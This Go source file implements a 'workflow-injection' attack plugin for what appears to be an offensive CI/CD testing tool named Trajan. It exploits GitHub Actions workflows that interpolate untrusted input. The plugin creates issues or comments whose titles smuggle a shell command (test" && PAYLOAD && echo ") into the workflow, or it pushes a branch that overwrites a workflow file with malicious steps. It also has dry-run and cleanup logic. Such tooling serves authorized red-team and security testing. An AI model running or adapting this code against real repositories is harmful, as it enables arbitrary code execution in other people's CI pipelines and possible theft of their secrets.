package workflowinjection

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/github"
	"github.com/praetorian-inc/trajan/pkg/github/attacks/common"
)

func init() {
	registry.RegisterAttackPlugin("github", "workflow-injection", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements workflow injection attack
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new workflow injection attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"workflow-injection",
			"Inject malicious steps into existing workflows",
			"github",
			attacks.CategoryCICD,
		),
	}
}

// CanAttack checks if workflow injection is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return common.FindingHasType(findings, detections.VulnActionsInjection)
}

// getInjectionVectorFromFindings determines injection vector from findings.
// Prefers issue-based triggers since they're easiest to exploit.
func getInjectionVectorFromFindings(findings []detections.Finding) (trigger, workflowFile string) {
	for _, f := range findings {
		if f.Type == detections.VulnActionsInjection && strings.Contains(f.Trigger, "issues") {
			return f.Trigger, f.WorkflowFile
		}
	}
	for _, f := range findings {
		if f.Type == detections.VulnActionsInjection && strings.Contains(f.Trigger, "issue_comment") {
			return f.Trigger, f.WorkflowFile
		}
	}
	for _, f := range findings {
		if f.Type == detections.VulnActionsInjection {
			return f.Trigger, f.WorkflowFile
		}
	}
	return "", ""
}

// Execute performs the workflow injection attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Get GitHub client
	ghPlatform, ok := opts.Platform.(*github.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitHub"
		return result, fmt.Errorf("invalid platform type")
	}

	client := ghPlatform.Client()

	// Parse owner/repo
	owner, repo, err := common.ParseOwnerRepo(opts.Target)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Determine payload
	payload := opts.Payload
	if payload == "" {
		payload = "echo 'Workflow injection successful - Trajan attack'"
	}

	// Validate payload
	if opts.Payload != "" {
		if err := common.ValidatePayload(opts.Payload); err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("invalid payload: %v", err)
			return result, err
		}
	}

	// Determine injection vector from findings
	trigger, workflowFile := getInjectionVectorFromFindings(opts.Findings)
	if trigger == "" || workflowFile == "" {
		result.Success = false
		result.Message = "no injectable workflows found"
		return result, nil
	}

	// Route to appropriate injection method based on trigger
	if strings.Contains(trigger, "issues") {
		return p.executeIssueInjection(ctx, client, owner, repo, payload, workflowFile, opts.DryRun, result)
	} else if strings.Contains(trigger, "issue_comment") {
		return p.executeIssueCommentInjection(ctx, client, owner, repo, payload, workflowFile, opts.DryRun, result)
	} else {
		// Fallback to branch-based injection
		return p.executeBranchInjection(ctx, client, owner, repo, payload, workflowFile, opts.SessionID, opts.DryRun, result)
	}
}

// executeIssueInjection exploits issue-triggered workflows
func (p *Plugin) executeIssueInjection(ctx context.Context, client *github.Client, owner, repo, payload, workflowFile string, dryRun bool, result *attacks.AttackResult) (*attacks.AttackResult, error) {
	// Craft injection payload: test" && PAYLOAD && echo "
	craftedTitle := fmt.Sprintf(`test" && %s && echo "`, payload)
	craftedBody := "Trajan workflow injection test - this issue can be safely closed"

	if dryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would create issue with title: %s", craftedTitle)
		result.Artifacts = []attacks.Artifact{{Type: attacks.ArtifactIssue, Identifier: "dry-run", Description: "Issue to trigger workflow injection"}}
		return result, nil
	}

	issue, err := client.CreateIssue(ctx, owner, repo, craftedTitle, craftedBody)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create issue: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactIssue,
		Identifier:  fmt.Sprintf("%d", issue.Number),
		Description: fmt.Sprintf("Issue #%d created to trigger workflow injection", issue.Number),
		URL:         issue.HTMLURL,
	})

	time.Sleep(5 * time.Second)

	result.Success = true
	result.Message = fmt.Sprintf("Workflow injection via issue #%d created. Monitor workflow runs to verify execution.", issue.Number)
	result.CleanupActions = []attacks.CleanupAction{{
		Type:        attacks.ArtifactIssue,
		Identifier:  fmt.Sprintf("%d", issue.Number),
		Action:      "close",
		Description: "Close injection test issue",
	}}
	return result, nil
}

// executeIssueCommentInjection exploits issue_comment-triggered workflows
func (p *Plugin) executeIssueCommentInjection(ctx context.Context, client *github.Client, owner, repo, payload, workflowFile string, dryRun bool, result *attacks.AttackResult) (*attacks.AttackResult, error) {
	craftedTitle := "Trajan workflow injection test"
	craftedBody := "Test issue - can be safely closed"
	craftedComment := fmt.Sprintf(`test" && %s && echo "`, payload)

	if dryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would create issue and comment with: %s", craftedComment)
		result.Artifacts = []attacks.Artifact{
			{Type: attacks.ArtifactIssue, Identifier: "dry-run", Description: "Issue for comment injection"},
			{Type: attacks.ArtifactComment, Identifier: "dry-run", Description: "Comment to trigger workflow injection"},
		}
		return result, nil
	}

	// Create issue first
	issue, err := client.CreateIssue(ctx, owner, repo, craftedTitle, craftedBody)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create issue: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactIssue,
		Identifier:  fmt.Sprintf("%d", issue.Number),
		Description: fmt.Sprintf("Issue #%d created for comment injection", issue.Number),
		URL:         issue.HTMLURL,
	})

	// Add malicious comment
	comment, err := client.CreateIssueComment(ctx, owner, repo, issue.Number, craftedComment)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create comment: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactComment,
		Identifier:  fmt.Sprintf("%d", comment.ID),
		Description: "Comment with injection payload",
		URL:         comment.HTMLURL,
	})

	time.Sleep(5 * time.Second)

	result.Success = true
	result.Message = fmt.Sprintf("Workflow injection via issue #%d comment created. Monitor workflow runs to verify execution.", issue.Number)
	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactComment,
			Identifier:  fmt.Sprintf("%d", comment.ID),
			Action:      "delete",
			Description: "Delete injection comment",
		},
		{
			Type:        attacks.ArtifactIssue,
			Identifier:  fmt.Sprintf("%d", issue.Number),
			Action:      "close",
			Description: "Close injection test issue",
		},
	}
	return result, nil
}

// executeBranchInjection is the fallback branch-based injection
func (p *Plugin) executeBranchInjection(ctx context.Context, client *github.Client, owner, repo, payload, workflowFile, sessionID string, dryRun bool, result *attacks.AttackResult) (*attacks.AttackResult, error) {
	branchName := fmt.Sprintf("trajan-inject-%s", sessionID)

	if dryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would inject into workflow %s via branch %s", workflowFile, branchName)
		result.Artifacts = []attacks.Artifact{
			{Type: attacks.ArtifactBranch, Identifier: branchName, Description: "Attack branch"},
			{Type: attacks.ArtifactWorkflow, Identifier: workflowFile, Description: "Modified workflow"},
		}
		return result, nil
	}

	// Get default branch
	defaultBranch, err := common.GetDefaultBranch(ctx, client, owner, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	// Get default branch SHA
	branchSHA, err := common.GetBranchSHA(ctx, client, owner, repo, defaultBranch)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}

	// Create attack branch
	_, err = client.CreateBranch(ctx, owner, repo, branchName, branchSHA)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	// Create malicious workflow using the actual workflowFile from Finding
	injectedContent := common.EncodeBase64(common.WorkflowInjectionPayload(payload))
	_, err = client.CreateOrUpdateFile(ctx, owner, repo, workflowFile, github.FileContentInput{
		Message: "Inject malicious workflow step",
		Content: injectedContent,
		Branch:  branchName,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to inject workflow: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  workflowFile,
		Description: "Workflow injected with malicious steps",
		URL:         fmt.Sprintf("https://github.com/%s/%s/blob/%s/%s", owner, repo, branchName, workflowFile),
	})

	result.Success = true
	result.Message = fmt.Sprintf("Workflow injection successful on branch %s", branchName)
	result.CleanupActions = []attacks.CleanupAction{{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Action:      "delete",
		Description: "Delete attack branch",
	}}

	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	ghPlatform, ok := session.Platform.(*github.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}

	client := ghPlatform.Client()

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		// Parse owner/repo from per-result repo (supports org-wide attacks)
		var owner, repo string
		var err error
		if result.Repo != "" {
			owner, repo, err = common.ParseRepoString(result.Repo)
		} else {
			owner, repo, err = common.ParseOwnerRepo(session.Target)
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "  Skipping cleanup for %s: %v\n", result.Plugin, err)
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactBranch:
				if err := client.DeleteBranch(ctx, owner, repo, action.Identifier); err != nil {
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			case attacks.ArtifactIssue:
				var issueNum int
				if _, err := fmt.Sscanf(action.Identifier, "%d", &issueNum); err != nil {
					fmt.Fprintf(os.Stderr, "  Invalid issue number %s: %v\n", action.Identifier, err)
					continue
				}
				if err := client.CloseIssue(ctx, owner, repo, issueNum); err != nil {
					return fmt.Errorf("closing issue %d: %w", issueNum, err)
				}
			case attacks.ArtifactComment:
				var commentID int
				if _, err := fmt.Sscanf(action.Identifier, "%d", &commentID); err != nil {
					fmt.Fprintf(os.Stderr, "  Invalid comment ID %s: %v\n", action.Identifier, err)
					continue
				}
				if err := client.DeleteIssueComment(ctx, owner, repo, commentID); err != nil {
					return fmt.Errorf("deleting comment %d: %w", commentID, err)
				}
			}
		}
	}

	return nil
}
